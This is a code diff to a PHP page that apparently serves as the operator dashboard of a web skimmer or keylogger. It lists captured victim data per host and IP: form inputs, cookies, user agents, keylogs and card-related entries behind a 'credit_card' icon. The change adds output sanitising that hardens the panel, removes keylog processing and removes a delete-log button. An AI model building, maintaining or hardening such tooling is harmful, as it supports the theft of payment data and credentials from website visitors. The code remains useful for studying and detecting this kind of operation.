@@ -115,6 +115,16 @@
     </thead>
     <tbody>
         <?php
+
+        function sanitizeInput($input) {
+            // Remove tags HTML e PHP
+            $cleaned = strip_tags($input);
+
+            // Substitua caracteres especiais por entidades HTML
+            $cleaned = htmlspecialchars($cleaned, ENT_QUOTES, 'UTF-8');
+            return $cleaned;
+        }
+        
         $data = array();
 
         foreach (get_dirs() as $ip_dir) {
@@ -137,8 +147,6 @@
                         continue;
                     }
 
-                    $keylogs = str_replace([" <Shift> ", "<TAB>"], ['', '\n'], $i["keyLogs"]);
-
                     // Store data in an array with timestamp for sorting
                     $timestamp = strtotime("$date $time");
                     $data[] = [
@@ -160,21 +168,18 @@
         });
 
         $id = 1; // Initialize ID to 1
-
         foreach ($data as $row) {
             echo "
                 <tr>
-                    <td>$id</td>
-                    <td><a style='color: white;' href='http://{$row['host']}'>{$row['host']}</a></td>
-                    <td>{$row['remote_ip']}</td>
-                    <td>{$row['time']} - {$row['date']}</td>
-                    <td>{$row['inputs']}</td>
+                    <td>" . sanitizeInput($id) . "</td>
+                    <td><a style='color: white;' href='http://" . sanitizeInput($row['host']) . "'>" . sanitizeInput($row['host']) . "</a></td>
+                    <td>" . sanitizeInput($row['remote_ip']) . "</td>
+                    <td>" . sanitizeInput("{$row['time']} - {$row['date']}") . "</td>
+                    <td>" . sanitizeInput($row['inputs']) . "</td>
                     <td>
-                        <i title='Show information' class='sinfo material-icons' onclick=\"read_log('{$row['remote_ip']}', '$location', '{$row['host']}', '$uagents', '{$row['cookies']}', '{$row['date']}', '{$row['time']}', '$name');\">credit_card</i>
-                        <i title='Remove log' class='rlogs material-icons' onclick=\"remove_log('$log_file', this);\">delete_forever</i>
+                        <i title='Show information' class='sinfo material-icons' onclick=\"read_log('" . sanitizeInput($row['remote_ip']) . "', '" . sanitizeInput($location) . "', '" . sanitizeInput($row['host']) . "', '" . sanitizeInput($uagents) . "', '" . sanitizeInput($row['cookies']) . "', '" . sanitizeInput($row['date']) . "', '" . sanitizeInput($row['time']) . "', '" . sanitizeInput($name) . "');\">credit_card</i>
                     </td>
                 </tr>";
-
             $id++; // Increment the ID
         }
         ?>
